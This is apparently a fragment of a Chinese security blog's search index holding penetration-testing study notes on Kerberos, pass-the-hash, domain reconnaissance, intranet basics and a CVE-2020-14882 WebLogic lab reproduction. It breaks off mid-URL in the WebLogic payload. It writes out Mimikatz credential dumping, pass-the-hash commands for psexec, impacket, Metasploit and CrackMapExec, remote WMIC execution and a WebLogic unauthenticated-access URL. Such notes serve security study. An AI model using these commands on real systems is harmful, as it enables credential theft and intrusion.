class="line">基于资源的约束委派攻击</span><br></pre></td></tr></table></figure><h2 id="4、PAC阶段-MS14-068"><a href="#4、PAC阶段-MS14-068" class="headerlink" title="4、PAC阶段(MS14-068)"></a>4、PAC阶段(MS14-068)</h2><p>PAC介绍</p><p>在Kerberos最初设计的几个流程里说明了如何证明Client是Client而不是由其他人来冒充的但并没有声明Client有没有访问Server服务的权限因为在域中不同权限的用户能够访问的资源是有区别的。</p><p>所以Microsoft为了解决这个问题在实现Kerberos时加入了PAC的概念，PAC全称是(Privilege Attribute Certificate 特权属性证书)</p><p>PAC可以理解为一串校验信息为了防止被伪造和篡改原则上是存放在TGT里并且TGT由KDC Hash加密。同时尾部会有两个数字签名分别由KDC密码和Server密码加密防止数字签名内容被篡改。</p><h1 id="七、Kerberos词汇扩展"><a href="#七、Kerberos词汇扩展" class="headerlink" title="七、Kerberos词汇扩展"></a>七、Kerberos词汇扩展</h1><p><img src="https://pic.888888.al/i/2023/08/15/10s7gdk.png" alt="9"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Kerberos协议 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Kerberos协议 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>PTH传递</title>
+      <link href="/archives/a4ebb772.html"/>
+      <url>/archives/a4ebb772.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h1><h2 id="PTH-pass-the-hash-HASH传递"><a href="#PTH-pass-the-hash-HASH传递" class="headerlink" title="PTH(pass-the-hash)HASH传递"></a>PTH(pass-the-hash)HASH传递</h2><p>pass-the-hash 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。</p><p>pass the hash 原理：</p><p>• 在 Windows 系统中，通常会使用 NTLM 身份认证</p><p>• NTLM 认证不使用明文口令，而是使用口令加密后的 hash 值，hash 值由系统 API 生成(例如 LsaLogonUser)<br>• hash 分为 LM hash 和 NT hash，如果密码长度大于 15，那么无法生成 LMhash。从 Windows Vista 和 Windows Server 2008 开始，微软默认禁用 </p><p>• 如果攻击者获得了 hash，就能够在身份验证的时候模拟该用户(即跳过调用API 生成 hash 的过程)</p><p>这类攻击适用于：</p><p>• 域&#x2F;工作组环境</p><p>• 可以获得 hash，但是条件不允许对 hash 爆破</p><p>• 内网中存在和当前机器相同的密码</p><p>微软也对 pth 打过补丁，然而在测试中发现，在打了补丁后，常规的 Pass The<br>Hash 已经无法成功，唯独默认的 Administrator(SID 500)账号例外，利用这个账号<br>仍可以进行 Pass The Hash 远程 ipc 连接。</p><p>如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使<br>用 mimikatz 还是可以攻击成功。</p><p>从 windows 到 windows 横向 pth 这一类攻击方法比较广泛。</p><h2 id="mimitkaz-pth"><a href="#mimitkaz-pth" class="headerlink" title="mimitkaz pth"></a>mimitkaz pth</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">privilege::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">logonpasswords</span></span></span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;<span class="keyword">exit</span>&quot;&gt; password.txt</span><br><span class="line">因为mimikatz不能粘贴复制，所以我们可以将执行结果导入倒txt文件中</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10tnr44.png" alt="0"></p><p>得到 hash 后进行</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">privilege::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">pth</span> /<span class="title">user:administrator</span> /<span class="title">domain:workgroup</span> /<span class="title">ntlm</span>:32<span class="title">ed87bdb5fdc</span></span></span><br><span class="line"><span class="function">5<span class="title">e9cba88547376818d4</span></span></span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10u15wj.png" alt="1"></p><p><strong>成功后 会弹出终端 cmd。</strong></p><h2 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h2><p>psexec 是 windows 官方自带的，不会存在查杀问题，属于 pstools 利用 PsExec 可以在远程计算机上执行命令，其基本原理是通过管道在远程目标主机上创建一个psexec 服务，并在本地磁盘中生成一个名为 PSEXESVC 的二进制文件，然后通过psexec 服务运行命令，运行结束后删除服务。</p><p>利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 服务端口开放。对方开放 445 端口，就相当于开放了 smb 协议</p><p>psexec 第一种：先有 ipc 链接，psexec 需要明文或 hash 传递</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">PsExec64.exe /accepteula /s \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">123</span> -u Administrator -p <span class="number">123456</span> <span class="built_in">cmd</span></span><br></pre></td></tr></table></figure><p>-accepteula 第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框</p><p>-s 以 System 权限运行远程进程，如果不用这个参数，就会获得一个对应用户权限的 shell</p><p>直接直接执行回显</p><p>-u 域\用户名</p><p>-p 密码</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">PsExec.exe /accepteula /s \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">141</span> -u Administrator -p <span class="number">123456</span> <span class="built_in">cmd</span> /c &quot;<span class="built_in">ipconfig</span>&quot;</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10up4ov.png" alt="2"></p><p>查看是否开放445端口</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netstat -ano | <span class="built_in">find</span> &quot;<span class="number">445</span>&quot;</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10utluq.png" alt="3"></p><p>上面是建立在明文之上 下面 hash 下进行登录</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">psexec -hashes aad3b435b51404eeaad3b435b51404ee:<span class="number">32</span>ed87bdb5fdc5e9cba8854</span><br><span class="line"><span class="number">7376818</span>d4 ./Administrator@<span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">123</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/16/z61h3r.png" alt="4"></p><p>出现这个错误可以使用 impacket 这个工具包下的 psexec 进行利用</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python3 psexec.py -hashes aa:<span class="number">32</span>ed87bdb5fdc5e9cba88547376818d4 ./Administrator@<span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">123</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10vf30k.png" alt="5"></p><p>在使用 PsExec 时需要注意以下几点：</p><p>• 需要远程系统开启 admin$ 共享（默认是开启的）</p><p>• 因为 PsExec 连接的原理是基于 IPC 共享，因此目标需要开放 445 端口</p><p>• 在使用 IPC$ 连接目标系统后，不需要输入账户和密码。</p><p>• 在使用 PsExec 执行远程命令时，会在目标系统中创建一个 psexec 的服务，命令执行完后，psexec 服务将被自动删除。由于创建或删除服务时会产生大量的日志，因此蓝队在溯源时可以通过日志反推攻击流程。</p><p>• 使用 PsExec 可以直接获得 System 权限的交互式 Shell 的前提目标是administrator 权限的 shell </p><p>• 在域环境测试时发现，非域用户无法利用内存中的票据使用 PsExec 功能，只能依靠账号和密码进行传递。</p><p>登陆域管理命令</p><p>impacket 下的 psexec</p><p>python3 psexec.py moonsec&#x2F;<a href="mailto:&#65;&#100;&#x6d;&#105;&#110;&#105;&#x73;&#116;&#114;&#x61;&#x74;&#111;&#114;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#x30;&#x2e;&#x31;&#x34;&#50;">&#65;&#100;&#x6d;&#105;&#110;&#105;&#x73;&#116;&#114;&#x61;&#x74;&#111;&#114;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#x30;&#x2e;&#x31;&#x34;&#50;</a></p><p>执行命令后输入密码</p><p>登陆其他主机管理员</p><p>psexec &#x2F;accepteula &#x2F;s \12server1 -u Administrator -p 123456 cmd</p><h2 id="使用-msf-hash-模块"><a href="#使用-msf-hash-模块" class="headerlink" title="使用 msf hash 模块"></a>使用 msf hash 模块</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="built_in">set</span> SMBUser Administrator</span><br><span class="line"><span class="built_in">set</span> rhosts <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">141</span></span><br><span class="line"><span class="built_in">set</span> smbpass aad3b435b51404eeaad3b435b51404ee:<span class="number">32</span>ed87bdb5fdc5e9cba885473</span><br><span class="line"><span class="number">76818</span>d4</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10vwrti.png" alt="6"></p><h2 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h2><p>CrackMapExec 可以对 C 段中的主机进行批量 pth,项目地址：</p><p><a href="https://github.com/byt3bl33d3r/CrackMapExec.git">https://github.com/byt3bl33d3r/CrackMapExec.git</a></p><p>使用命令：</p><p>crackmapexec smb 192.168.0.0&#x2F;24 -u administrator -H 32ed87bdb5fdc5e9cba88547376818d4</p><p>对 192.168.9.0&#x2F;24 C 段进行批量 pass the hash<br><img src="https://pic.888888.al/i/2023/08/15/10wav3v.png" alt="7"></p><h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><p>WMI 全称 Windows Management Instrumentation 即 Windows 管理工具，<br>Windows 98 以后的操作系统都支持 WMI。</p><p>由于 Windows 默认不会将 WMI 的操作记录在日志里，同时现在越来越多的杀软将<br>PsExec 加入了黑名单，因此 WMI 比 PsExec 隐蔽性要更好一些。</p><h3 id="wmic-命令"><a href="#wmic-命令" class="headerlink" title="wmic 命令"></a>wmic 命令</h3><p>WMI 连接远程主机，并使用目标系统的 cmd.exe 执行命令，将执行结果保存在目<br>标主机 C 盘的 ip.txt 文件中</p><p>使用 WMIC 连接远程主机，需要目标主机开放 135 和 445 端口</p><p>( 135 端⼝是 WMIC 默认的管理端⼝，wimcexec 使⽤445 端⼝传回显)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:192.168.0.123 /user:administrator /password:123456 process call create &quot;cmd.exe /c ipconfig &gt; c:\ip.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10wh6gx.png" alt="8"><br>.</p><p>.</p><p>.</p><p>之后建立 IPC$ ，使用 type 读取执行结果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\192.168.0.123\ipc$ &quot;123456&quot; /user:administrator</span><br><span class="line">type \\192.168.0.123\c$\ip.txt</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10wlisi.png" alt="9"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 横向渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 横向渗透 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>域信息收集命令</title>
+      <link href="/archives/397dc553.html"/>
+      <url>/archives/397dc553.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="域信息收集命令"><a href="#域信息收集命令" class="headerlink" title="域信息收集命令"></a>域信息收集命令</h1><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">query user || qwinsta 查看当前在线用户</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> user 查看本机用户</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> user /domain 查看域用户</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> view &amp; <span class="built_in">net</span> group &quot;domain computers&quot; /domain 查看当前域计算机列表 第二</span><br><span class="line">个查的更多</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> view /domain 查看有几个域</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> view \\\\dc 查看 dc 域内共享文件</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> group /domain 查看域里面的组</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> group &quot;domain admins&quot; /domain 查看域管</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> localgroup administrators /domain /这个也是查域管，是升级为域控时，</span><br><span class="line">本地账户也成为域管</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> group &quot;domain controllers&quot; /domain 域控</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> /domain</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> config workstation 当前登录域 - 计算机名 - 用户名</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> use \\\\域控(如 pc.xx.com) password /user:xxx.com\username 相当于这个</span><br><span class="line">帐号登录域内主机，可访问资源</span><br><span class="line"></span><br><span class="line"><span class="built_in">ipconfig</span></span><br><span class="line"></span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">tasklist /svc</span><br><span class="line"></span><br><span class="line">tasklist /S ip /U domain\username /P /V 查看远程计算机 tasklist</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> localgroup administrators &amp;&amp; whoami 查看当前是不是属于管理组</span><br><span class="line"></span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">nltest /dclist:xx 查看域控</span><br><span class="line"></span><br><span class="line">whoami /all 查看 Mandatory <span class="built_in">Label</span> uac 级别和 sid 号</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> sessoin 查看远程连接 session (需要管理权限)</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> share 共享目录</span><br><span class="line"></span><br><span class="line">cmdkey /l 查看保存登陆凭证</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">%logonserver%</span> 查看登陆域</span><br><span class="line"></span><br><span class="line">spn –l administrator spn 记录</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> 环境变量</span><br><span class="line"></span><br><span class="line">dsquery server - 查找目录中的 AD DC/LDS 实例</span><br><span class="line"></span><br><span class="line">dsquery user - 查找目录中的用户</span><br><span class="line"></span><br><span class="line">dsquery computer 查询所有计算机名称 windows <span class="number">2003</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> /s *.exe 查找指定目录下及子目录下没隐藏文件</span><br><span class="line"></span><br><span class="line">arp -a   查询通信</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ipconfig</span> /all 查询当前环境</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10gawvv.png" alt="0"></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> user /domain 查询当前域用户</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10ggmx8.png" alt="1"></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> 查询 域控</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10gyvdy.png" alt="2"></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> group /domain 查询域工作组</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10h4wo3.png" alt="3"></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> group &quot;domain admins&quot; /domain 查询域管理用户</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10hhvad.png" alt="4"></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> group &quot;Domain controllers&quot;查询有几台域控制器 需要域权限</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10hlsxg.png" alt="5"></p><h1 id="查找域服务器"><a href="#查找域服务器" class="headerlink" title="查找域服务器"></a>查找域服务器</h1><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> 查询时间 这个命令会请求域服务器的时间</span><br><span class="line"><span class="built_in">net</span> config workstation 查看当前工作环境</span><br><span class="line">nltest /dclist:域名 查询域控</span><br><span class="line"><span class="built_in">ping</span>/nslookup 查找域控</span><br></pre></td></tr></table></figure><h1 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h1><p>在域内进行横行渗透时，首先要收集主机的端口和 ip 信息</p><p>net view &#x2F;domain 查询域内的主机信息</p><p>发生系统错误 6118 出现这种错误时<strong>Computer Browser</strong>被禁用了,  在域管理启用即可<br><img src="https://pic.888888.al/i/2023/08/15/10ipbix.png" alt="6"></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">arp -a 查询通信</span><br><span class="line"></span><br><span class="line">nbtscan.exe -r <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">0</span>/<span class="number">24</span> 发现主机</span><br></pre></td></tr></table></figure><h2 id="基于-MSF-的内网主机探测"><a href="#基于-MSF-的内网主机探测" class="headerlink" title="基于 MSF 的内网主机探测"></a>基于 MSF 的内网主机探测</h2><p>使用 msf 进行反弹 shell 进行内网渗透时，通过 msf 自带的扫描模块进行快速扫<br>描。</p><p>主机存活探测：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/discovery/arp_sweep ARP 扫描</span><br><span class="line">auxiliary/scanner/discovery/udp_sweep UDP 扫描</span><br><span class="line">auxiliary/scanner/netbios/nbname NETBIOS 扫描</span><br><span class="line">auxiliary/scanner/snmp/snmp_enum SNMP 扫描</span><br><span class="line">auxiliary/scanner/smb/smb_version SMB 扫描</span><br><span class="line">端口扫描：</span><br><span class="line">auxiliary/scanner/portscan/ack TCP ACK 端口扫描</span><br><span class="line">auxiliary/scanner/portscan/ftpbounce FTP bounce 端口扫描</span><br><span class="line">auxiliary/scanner/portscan/syn SYN 端口扫描</span><br><span class="line">auxiliary/scanner/portscan/tcp TCP 端口扫描</span><br><span class="line">auxiliary/scanner/portscan/xmas TCP XMas 端口扫描</span><br></pre></td></tr></table></figure><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>Nmap 是一个端口扫描器，可用于主机发现、端口扫描、版本检测、OS 检测等。</p><p>使用场景：建立 socks 代理，proxychains+Nmap 扫描内网。</p><p>支持多种扫描模式：</p><p>-sT: TCP 扫描</p><p>-sS: SYN 扫描</p><p>-sA: ACK 扫描</p><p>-sF：FIN 扫描</p><p>-sU: UDP 扫描</p><p>-sR: RPC 扫描</p><p>-sP: ICMP 扫描</p><p>快速扫描所有端口：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nmap -sS -p <span class="number">1</span>-<span class="number">65535</span> -v <span class="number">192</span>.<span class="number">168</span>.<span class="number">99</span>.<span class="number">177</span></span><br></pre></td></tr></table></figure><h1 id="常见的端口与服务"><a href="#常见的端口与服务" class="headerlink" title="常见的端口与服务"></a>常见的端口与服务</h1><table><thead><tr><th>端口号</th><th>端口说明</th><th>攻击技巧</th></tr></thead><tbody><tr><td>21&#x2F;22&#x2F;69</td><td>ftp&#x2F;tftp：文件传输协议</td><td>爆破\嗅探\溢出\后门</td></tr><tr><td>22</td><td>ssh：远程连接</td><td>爆破 OpenSSH；28个退格</td></tr><tr><td>23</td><td>telnet：远程连接</td><td>爆破\嗅探</td></tr><tr><td>25</td><td>smtp：邮件服务</td><td>邮件伪造</td></tr><tr><td>53</td><td>DNS：域名系统</td><td>DNS 区域传输\DNS 劫持\DNS 缓存投毒\DNS欺骗\利用 DNS 隧道技术刺透防火墙</td></tr><tr><td>67&#x2F;68</td><td>dhcp</td><td>劫持\欺骗</td></tr><tr><td>110</td><td>pop3</td><td>爆破</td></tr><tr><td>139</td><td>samba</td><td>爆破\未授权访问\远程代码执行</td></tr><tr><td>143</td><td>imap</td><td>爆破</td></tr><tr><td>161</td><td>snmp</td><td>爆破</td></tr><tr><td>389</td><td>ldap</td><td>注入攻击\未授权访问</td></tr><tr><td>445</td><td>SMB</td><td>远程代码执行</td></tr><tr><td>512&#x2F;513&#x2F;514</td><td>linux r</td><td>直接使用 rlogin</td></tr><tr><td>873</td><td>rsync</td><td>未授权访问</td></tr><tr><td>1080</td><td>socket</td><td>爆破：进行内网渗透</td></tr><tr><td>1352</td><td>lotus</td><td>爆破：弱口令\信息泄漏：源代码</td></tr><tr><td>1433</td><td>mssql</td><td>爆破：使用系统用户登录\注入攻击</td></tr><tr><td>1521</td><td>oracle</td><td>爆破：TNS\注入攻击</td></tr><tr><td>2049</td><td>nfs</td><td>配置不当</td></tr><tr><td>2181</td><td>zookeeper</td><td>未授权访问</td></tr><tr><td>3306</td><td>mysql</td><td>爆破\拒绝服务\注入</td></tr><tr><td>3389</td><td>rdp</td><td>爆破\Shift 后门</td></tr><tr><td>4848</td><td>glassfish</td><td>爆破：控制台弱口令\认证绕过</td></tr><tr><td>5000</td><td>sybase&#x2F;DB2</td><td>爆破\注入</td></tr><tr><td>5432</td><td>postgresql</td><td>缓冲区溢出\注入攻击\爆破：弱口令</td></tr><tr><td>5632</td><td>pcanywhere</td><td>拒绝服务\代码执行</td></tr><tr><td>5900</td><td>vnc</td><td>爆破：弱口令\认证绕过</td></tr><tr><td>6379</td><td>redis</td><td>未授权访问\爆破：弱口令</td></tr><tr><td>7001</td><td>weblogic Java</td><td>反序列化\控制台弱口令\控制台部署webshell</td></tr><tr><td>80&#x2F;443&#x2F;8080</td><td>web</td><td>常见 web 攻击\控制台爆破\对应服务器版本漏洞</td></tr><tr><td>8069</td><td>zabbix</td><td>远程命令执行</td></tr><tr><td>9080</td><td>websphere</td><td>远程命令执行</td></tr><tr><td>9090</td><td>websphere</td><td>控制台 爆破：控制台弱口令\Java 反序列</td></tr><tr><td>9200&#x2F;9300</td><td>elasticsearch</td><td>远程代码执行</td></tr><tr><td>11211</td><td>memcacache</td><td>未授权访问</td></tr><tr><td>27017</td><td>mongodb</td><td>爆破\未授权访问</td></tr></tbody></table>]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 内网渗透 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>内网基础知识</title>
+      <link href="/archives/2bfd09c1.html"/>
+      <url>/archives/2bfd09c1.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="内网基础知识"><a href="#内网基础知识" class="headerlink" title="内网基础知识"></a>内网基础知识</h1><h2 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h2><p>工作组:工作组是局域网中的一个概念，他是长久的资源管理模式。默认情况下使用工作组方式进行资源管理，将不同的 computer 按照不同的要求分类到不同的组。<br><img src="https://pic.888888.al/i/2023/08/15/zo8d2k.png" alt="0"></p><p><strong>域:</strong> 用来描述一种架构，和“工作组”相对应，由工作组升级而来的高级架构，域<br>(Domain)是一个有安全边界的计算机集合（ 安全边界，意思是在两个域中，一个<br>域中的用户无法访问另一个域中的资源）。可以简单的把域理解成升级版的“工作<br>组”，相比工作组而言，它有一个更加严格的安全管理控制机制，如果你想访问域<br>内的资源，就必须拥有一个合法的身份登陆到该域中,而你对该域内的资源拥有什<br>么样的权限,还需要取决于你在该域中的用户身份。</p><h2 id="域的几种环境"><a href="#域的几种环境" class="headerlink" title="域的几种环境"></a>域的几种环境</h2><h3 id="•-单域"><a href="#•-单域" class="headerlink" title="• 单域"></a>• 单域</h3><p>通常一个小公司，一般一个域就可以，一个域内，要至少两台域服务器，一<br>台作为域控制器，另一台当备份。<br>活动目录的数据库【包括用户的账号信息】是存储在域控制器中，若没备<br>份，瘫痪了不能正常使用了！<br>父域和子域<br>出于管理及其他需求，需要在网络中划分多个域。第一个域称为父域，其他为子<br>域</p><h3 id="•-域树"><a href="#•-域树" class="headerlink" title="• 域树"></a>• 域树</h3><p><img src="https://pic.888888.al/i/2023/08/15/zoc68u.png" alt="1"></p><h3 id="•-域森林"><a href="#•-域森林" class="headerlink" title="• 域森林"></a>• 域森林</h3><p>指的是多个域树通过建立信任关系组成的集合</p><p>比如：一个公司并购其他公司<br><img src="https://pic.888888.al/i/2023/08/15/zpmm9r.png" alt="2"></p><h2 id="域名服务器-DNS"><a href="#域名服务器-DNS" class="headerlink" title="域名服务器 DNS"></a>域名服务器 DNS</h2><p>是指用于实现域名和与之相对应的 IP 地址转换的服务器。从对域树的介绍中来看<br>出，域树中的域名和 DNS 域名非常相似。而实际上，因为域名的计算机是使用<br>DNS 来定位域控制器、服务器及其他计算机、网络服务的，所以域的名字就是<br>DNS 域的名字。</p><p>在内网渗透测试中，大都是通过寻找 DNS 服务器来确定域控制器的位置的{DNS<br>服务器和域控制器通常配置在同一台机器上}</p><h2 id="域术语"><a href="#域术语" class="headerlink" title="域术语"></a>域术语</h2><p>DC:域控，域的创建者</p><p>域管理:域控上的管理员</p><p>AD 活得目录:Active Directory</p><p>NTDS.dit:域用户帐户以域数据库的形式保存在活动目录中</p><p>Ntdsutil.exe-ntdsutil.exe 是域控制器自带的域数据库管理工具，从 windows<br>Server 2008 开始就默认自带了。因此我们可以通过 ntdsutil.exe 提取出域中所有<br>的域用户信息。</p><p>常见结构:组织单元(OU)、域(DOMAIN)、域树(tree)、域森林(forest)，在域树内的<br>所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一<br>个域只存储该域内的数据<br>活动目录:</p><ul><li><p>帐号集中管理：所有帐号均存在服务器上，方便对帐号的重命名&#x2F;重置密码。</p></li><li><p>软件集中管理：统一推送软件，统一安装网络打印机等。利用软件发布策略分发<br>软件,可以让用户自由选择安装软件。</p></li><li><p>环境集中管理：利用 AD 可以统一客户端桌面，IE，TCP&#x2F;IP 等设置。</p></li><li><p>增强安全性：统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统<br>一制订用户密码策略等，可监控网络，资料统一管理。</p></li><li><p>更可靠：更少的宕机时间。如：利用 AD 控制用户访问权限，利用群集、负载均<br>衡等技术对文件服务器进行容灾设定，更可靠，宕机时间更少。</p></li><li><p>活动目录为 Microsoft 统一管理的基础平台，其它 ISA、Exchange、SMS 等服务<br>都依赖于这个基础平台。</p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 内网渗透 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CVE-2020-14882 WebLogic远程代码执行漏洞</title>
+      <link href="/archives/a67ffbba.html"/>
+      <url>/archives/a67ffbba.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="CVE-2020-14882-WebLogic远程代码执行漏洞"><a href="#CVE-2020-14882-WebLogic远程代码执行漏洞" class="headerlink" title="CVE-2020-14882 WebLogic远程代码执行漏洞"></a>CVE-2020-14882 WebLogic远程代码执行漏洞</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>2020年10月28日，Oracle发布的10月安全更新中的Oracle WebLogic Server 远程代码执行漏洞（CVE-<br>2020-14882）POC被公开，远程攻击者可以通过发送恶意的HTTP GET 请求。成功利用此漏洞的攻击者<br>可在未经身份验证的情况下控制 WebLogic Server Console ，并执行任意代码。<br>2020年10月29日, Oracle发布的漏洞补丁CVE-2020-14882存在可绕过的0day漏洞。即在Weblogic补丁<br>更新完成后，攻击者仍可绕过WebLogic后台登录等限制，并控制Weblogic服务器。</p><h2 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2.影响版本"></a>2.影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Oracle Weblogic Server 10.3.6.0.0</span><br><span class="line">Oracle Weblogic Server 12.1.3.0.0</span><br><span class="line">Oracle Weblogic Server 12.2.1.3.0</span><br><span class="line">Oracle Weblogic Server 12.2.1.4.0</span><br><span class="line">Oracle Weblogic Server 14.1.1.0.0</span><br></pre></td></tr></table></figure><h2 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h2><p>首先进入CVE-2020-14882的docker环境</p><p>sudo docker-compose up -d</p><p>构造url 达到未授权登录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.159:7001/console/images/%252E%252E%252Fconsole.portal?</span><br><span class="line">_nfpb=true&amp;_pageLabel=AppDeploymentsControlPage&amp;handle=com.bea.console.handles.J</span><br><span class="line">MXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/zllc5y.png" alt="0"><br>访问即可进入后台，达到未授权访问的效果</p><p>但是这里没有部署安装的按钮，也就是说不能像常规进入后台后写shell进去，这里就需要用到远程加载<br>XML文件拿shell</p><p>首先测试以下漏洞代码执行是否成功，在&#x2F;tmp&#x2F;下创建一个test文件夹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.159:7001//console/images/%252E%252E%252Fconsole.portal?</span><br><span class="line">_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSess</span><br><span 